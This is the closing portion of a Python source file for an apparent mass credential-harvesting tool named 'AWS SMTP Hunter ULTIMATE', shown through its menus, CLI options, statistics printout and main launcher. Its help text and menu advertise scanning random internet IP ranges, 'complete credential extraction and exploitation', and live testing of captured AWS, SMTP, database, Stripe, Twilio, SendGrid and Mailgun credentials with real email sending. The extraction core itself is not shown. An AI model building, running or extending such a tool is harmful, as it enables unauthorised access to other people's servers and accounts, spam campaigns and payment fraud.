            print(f"   SMS Ready:          {self.stats.get('aws_sms_ready', 0):,}")
            
        if self.stats['database_working'] > 0:
            print(f"\n🗄️ DATABASE ACCESS:")
            print(f"   MySQL:              {self.stats.get('mysql_working', 0):,}")
            print(f"   PostgreSQL:         {self.stats.get('postgresql_working', 0):,}")
            
        if self.stats['api_working'] > 0:
            print(f"\n🔗 API ACCESS:")
            print(f"   Twilio:             {self.stats.get('twilio_working', 0):,}")
            print(f"   Stripe:             {self.stats.get('stripe_working', 0):,}")
            print(f"   SendGrid:           {self.stats.get('sendgrid_working', 0):,}")
            print(f"   Mailgun:            {self.stats.get('mailgun_working', 0):,}")
            
        # Files generated
        print(f"\n📁 FILES GENERATED:")
        total_size = 0
        for file_key, filename in self.output_files.items():
            try:
                size = os.path.getsize(filename) if os.path.exists(filename) else 0
                total_size += size
                print(f"   {filename:35} {size:,} bytes")
            except:
                print(f"   {filename:35} Error")
                
        print(f"   {'TOTAL SIZE:':35} {total_size:,} bytes ({total_size/1024/1024:.1f} MB)")
        
        print("="*120)
        print("🎯 SCAN COMPLETED - Thank you for using AWS SMTP Hunter ULTIMATE!")
        print("="*120)


# ==================== FONCTIONS UTILITAIRES ====================

def setup_signal_handlers(hunter):
    """⚡ Configuration gestionnaires de signaux"""
    def signal_handler(signum, frame):
        print(f"\n🛑 Signal {signum} received - Graceful shutdown...")
        hunter.stop_complete_scan()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

def check_system_requirements():
    """🔍 Vérification des prérequis système"""
    print("🔍 Checking system requirements...")
    
    # Python version
    if sys.version_info < (3, 7):
        print("❌ Python 3.7+ required")
        return False
        
    # Required modules
    required = [
        ('psutil', 'System monitoring'),
        ('requests', 'HTTP requests'),
        ('urllib3', 'HTTP utilities')
    ]
    
    missing = []
    for module, desc in required:
        try:
            __import__(module)
            print(f"✅ {module} - {desc}")
        except ImportError:
            print(f"❌ {module} - {desc} (pip install {module})")
            missing.append(module)
            
    # Optional modules
    optional = [
        ('aiohttp', 'Async HTTP (performance boost)', AIOHTTP_AVAILABLE),
        ('boto3', 'AWS testing', BOTO3_AVAILABLE),
        ('mysql.connector', 'MySQL testing', MYSQL_AVAILABLE),
        ('psycopg2', 'PostgreSQL testing', POSTGRES_AVAILABLE),
        ('stripe', 'Stripe API testing', STRIPE_AVAILABLE),
        ('twilio', 'Twilio API testing', TWILIO_AVAILABLE)
    ]
    
    for module, desc, available in optional:
        status = "✅" if available else "⚠️"
        print(f"{status} {module} - {desc}")
        
    if missing:
        print(f"\n❌ Missing required modules: {', '.join(missing)}")
        print("Install with: pip install " + " ".join(missing))
        return False
        
    print("✅ All system requirements satisfied")
    return True

def show_interactive_menu():
    """📋 Menu interactif ultra-complet"""
    print("="*120)
    print("🔥 AWS SMTP HUNTER ULTIMATE v5.0 - COMPLETE EDITION")
    print("🎯 MAXIMUM PERFORMANCE CONFIGURATION")
    print("="*120)
    print()
    print("🎯 IP GENERATION MODES:")
    print("   1. SMART    - Intelligent generation targeting productive ranges")
    print("   2. RANDOM   - Pure random generation for maximum coverage")
    print("   3. HYBRID   - 70% Smart + 30% Random (RECOMMENDED)")
    print()
    print("⚡ FEATURES INCLUDED:")
    print("   • Async + Multi-threading for maximum performance")
    print("   • Real-time framework detection (Laravel, Symfony, Django, etc.)")
    print("   • Complete credential extraction and exploitation")
    print("   • Live SMTP testing with real email sending")
    print("   • AWS credentials testing with service quotas")
    print("   • Database connection testing (MySQL, PostgreSQL)")
    print("   • API testing (Twilio, Stripe, SendGrid, Mailgun)")
    print("   • Intelligent learning and adaptation")
    print("   • Advanced performance monitoring")
    print("   • Automatic cleanup and optimization")
    print("   • Comprehensive logging and reporting")
    print()
    print("🔧 PERFORMANCE OPTIMIZATIONS:")
    print("   • Adaptive delays (0.01-0.1s)")
    print("   • Intelligent queue management")
    print("   • Memory optimization and cleanup")
    print("   • CPU usage monitoring and adjustment")
    print("   • Network optimization")
    print()
    
    while True:
        try:
            choice = input("🎯 Choose generation mode (1-3): ").strip()
            if choice == '1':
                return 'smart'
            elif choice == '2':
                return 'random'
            elif choice == '3':
                return 'hybrid'
            else:
                print("❌ Invalid choice. Please select 1, 2, or 3.")
        except KeyboardInterrupt:
            print("\n🛑 Exit requested")
            sys.exit(0)

def get_advanced_configuration():
    """⚙️ Configuration avancée interactive"""
    print("\n⚙️ ADVANCED CONFIGURATION:")
    
    # Threads
    while True:
        try:
            default_threads = min(2000, multiprocessing.cpu_count() * 50)
            threads_input = input(f"🔧 Number of threads (default: {default_threads}, max: 5000): ").strip()
            if not threads_input:
                threads = default_threads
                break
            threads = int(threads_input)
            if 1 <= threads <= 5000:
                break
            print("❌ Threads must be between 1 and 5000")
        except ValueError:
            print("❌ Please enter a valid number")
        except KeyboardInterrupt:
            print("\n🛑 Exit requested")
            sys.exit(0)
    
    # Email
    while True:
        try:
            email = input("📧 Test email for SMTP validation (default: test@example.com): ").strip()
            if not email:
                email = "test@example.com"
                break
            if '@' in email and '.' in email.split('@')[1]:
                break
            print("❌ Invalid email format")
        except KeyboardInterrupt:
            print("\n🛑 Exit requested")
            sys.exit(0)
    
    # Debug mode
    while True:
        try:
            debug_input = input("🐛 Enable debug mode? (y/N): ").strip().lower()
            debug = debug_input in ['y', 'yes', '1', 'true']
            break
        except KeyboardInterrupt:
            print("\n🛑 Exit requested")
            sys.exit(0)
    
    return threads, email, debug

def parse_command_line_arguments():
    """📋 Parsing des arguments CLI ultra-complet"""
    parser = argparse.ArgumentParser(
        description="🔥 AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
🔥 EXAMPLES:
  python hunter.py                                    # Interactive mode
  python hunter.py --mode hybrid --threads 1000      # Quick start
  python hunter.py --mode smart --threads 2000 --email your@email.com --debug
  
🎯 MODES:
  smart   : Intelligent targeting of productive IP ranges
  random  : Pure random generation for maximum coverage  
  hybrid  : Combination of smart + random (70/30 split)
  
⚡ PERFORMANCE:
  • Recommended threads: 1000-2000 for optimal performance
  • Higher thread counts require more system resources
  • Async mode automatically enabled if aiohttp available
  
📧 FEATURES:
  • Real-time SMTP testing with email sending
  • AWS credentials validation with service analysis
  • Database connection testing (MySQL, PostgreSQL)
  • API testing (Twilio, Stripe, SendGrid, Mailgun)
  • Framework detection (Laravel, Symfony, Django, etc.)
  • Intelligent learning and performance adaptation
        """
    )
    
    parser.add_argument(
        '--mode', '-m',
        choices=['smart', 'random', 'hybrid'],
        help='IP generation mode (default: interactive)'
    )
    
    parser.add_argument(
        '--threads', '-t',
        type=int,
        help='Number of threads (default: auto-detect, max: 5000)'
    )
    
    parser.add_argument(
        '--email', '-e',
        type=str,
        help='Test email for SMTP validation (default: test@example.com)'
    )
    
    parser.add_argument(
        '--debug', '-d',
        action='store_true',
        help='Enable debug mode with verbose logging'
    )
    
    parser.add_argument(
        '--output-dir', '-o',
        type=str,
        help='Output directory for results (default: current directory)'
    )
    
    parser.add_argument(
        '--config',
        type=str,
        help='Load configuration from JSON file'
    )
    
    parser.add_argument(
        '--version', '-v',
        action='version',
        version='AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition'
    )
    
    parser.add_argument(
        '--quiet', '-q',
        action='store_true',
        help='Quiet mode - minimal output'
    )
    
    parser.add_argument(
        '--no-async',
        action='store_true',
        help='Disable async mode (force sync only)'
    )
    
    return parser.parse_args()

def load_configuration_file(config_path):
    """📄 Chargement configuration depuis fichier JSON"""
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
            
        return {
            'mode': config.get('mode', 'hybrid'),
            'threads': config.get('threads', 1000),
            'email': config.get('email', 'test@example.com'),
            'debug': config.get('debug', False)
        }
    except Exception as e:
        print(f"❌ Error loading config file: {e}")
        return None

def validate_configuration(mode, threads, email, debug):
    """✅ Validation de la configuration"""
    errors = []
    
    # Validation mode
    if mode not in ['smart', 'random', 'hybrid']:
        errors.append(f"Invalid mode: {mode}")
        
    # Validation threads
    if not 1 <= threads <= 5000:
        errors.append(f"Threads must be between 1 and 5000, got: {threads}")
        
    # Validation email
    if not email or '@' not in email:
        errors.append(f"Invalid email: {email}")
        
    # Warning for high thread count
    if threads > 3000:
        print(f"⚠️ WARNING: {threads} threads is very high and may impact system performance")
        
    if errors:
        print("❌ Configuration errors:")
        for error in errors:
            print(f"   • {error}")
        return False
        
    return True

def main():
    """🚀 Fonction principale ultra-complète"""
    print("🔥 AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition")
    print("🎯 Initializing maximum performance configuration...")
    
    # Vérification des prérequis
    if not check_system_requirements():
        print("❌ System requirements not met")
        sys.exit(1)
    
    # Parsing des arguments
    args = parse_command_line_arguments()
    
    # Configuration
    if args.config:
        # Chargement depuis fichier
        config = load_configuration_file(args.config)
        if not config:
            sys.exit(1)
        mode = config['mode']
        threads = config['threads']
        email = config['email']
        debug = config['debug']
    elif args.mode and args.threads and args.email:
        # Configuration via CLI
        mode = args.mode
        threads = args.threads
        email = args.email
        debug = args.debug
    else:
        # Configuration interactive
        mode = show_interactive_menu()
        threads, email, debug = get_advanced_configuration()
    
    # Override avec args CLI si spécifiés
    if args.mode:
        mode = args.mode
    if args.threads:
        threads = args.threads
    if args.email:
        email = args.email
    if args.debug:
        debug = True
        
    # Validation finale
    if not validate_configuration(mode, threads, email, debug):
        sys.exit(1)
    
    # Configuration output directory
    if args.output_dir:
        try:
            os.makedirs(args.output_dir, exist_ok=True)
            os.chdir(args.output_dir)
        except Exception as e:
            print(f"❌ Error setting output directory: {e}")
            sys.exit(1)
    
    # Disable async if requested
    global AIOHTTP_AVAILABLE
    if args.no_async:
        AIOHTTP_AVAILABLE = False
        print("⚠️ Async mode disabled by user request")
    
    # Affichage configuration finale
    if not args.quiet:
        print(f"\n⚙️ FINAL CONFIGURATION:")
        print(f"   Mode:              {mode}")
        print(f"   Threads:           {threads}")
        print(f"   Test Email:        {email}")
        print(f"   Debug Mode:        {debug}")
        print(f"   Async Available:   {AIOHTTP_AVAILABLE}")
        print(f"   Output Directory:  {os.getcwd()}")
        print(f"   Quiet Mode:        {args.quiet}")
    
    # Création du hunter
    try:
        hunter = UltimateAWSHunter(
            mode=mode,
            threads=threads,
            test_email=email,
            debug=debug
        )
        
        # Configuration gestionnaires de signaux
        setup_signal_handlers(hunter)
        
        # Confirmation finale si interactif
        if not args.mode and not args.quiet:
            print(f"\n🚀 READY TO START COMPLETE SCAN!")
            print(f"   This will use {threads} threads for maximum performance")
            print(f"   All credentials found will be tested and verified")
            print(f"   Results will be saved in multiple output files")
            print(f"   Real-time monitoring and adaptation enabled")
            input("\n🚀 Press Enter to start the complete scan...")
        
        # Lancement du scan complet
        hunter.run_complete_scan()
        
    except KeyboardInterrupt:
        print("\n🛑 Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Critical error: {e}")
        if debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Protection multiprocessing
    multiprocessing.freeze_support()
    
    # Vérification version Python
    if sys.version_info < (3, 7):
        print("❌ Python 3.7+ required for AWS SMTP Hunter ULTIMATE")
        sys.exit(1)
    
    # Lancement
    main()
